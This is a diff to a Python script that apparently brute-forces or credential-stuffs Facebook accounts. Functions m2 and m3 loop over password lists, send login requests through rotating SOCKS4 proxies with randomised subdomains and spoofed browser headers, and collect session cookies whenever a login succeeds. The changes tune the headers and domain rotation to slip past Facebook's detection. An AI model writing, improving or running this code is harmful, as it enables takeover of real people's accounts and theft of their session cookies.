@@ -802,7 +802,7 @@ def m2(ids,pwv):
             "login":"Log In"}
             update={
             'authority': f'{fb}.facebook.com',
-            'method': 'GET',  # Assuming this is a GET request
+            'method': 'POST',  # Assuming this is a POST request
             'path': '/',      # Assuming this is the path of the request
             'scheme': 'https',
             'accept': '*/*',
@@ -869,6 +869,9 @@ def m3(ids,pwv):
     warna = random.choice(my_color)
     nip=random.choice(proxsi)
     proxs= {'http': 'socks4://'+nip}
+    DOMAIN = ("m","business","mbasic","p")
+    fb= random.choice(DOMAIN)
+    uger = random.choice(ugrn)
     try:
         for pas in pwv:
             free_fb = session.get('https://m.facebook.com').text
@@ -883,23 +886,29 @@ def m3(ids,pwv):
             "pass":pas,
             "login":"Log In"}
             update={
-            'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9,hi;q=0.8,bn;q=0.7',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '1',
+            'origin': f'https://{fb}.facebook.com',
+            'priority': 'u=0, i',
+            'referer': f'https://{fb}.facebook.com/?locale2=en_GB&_rdr',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+            'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.127", "Google Chrome";v="126.0.6478.127"',
             'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
-            session.post('https://m.facebook.com/login/device-based/login/async/?',data=info,headers=update,proxies=proxs).text
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+            'viewport-width': '885',}
+            session.post(f'https://{fb}.facebook.com/login/device-based/login/async/?',data=info,headers=update,proxies=proxs).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
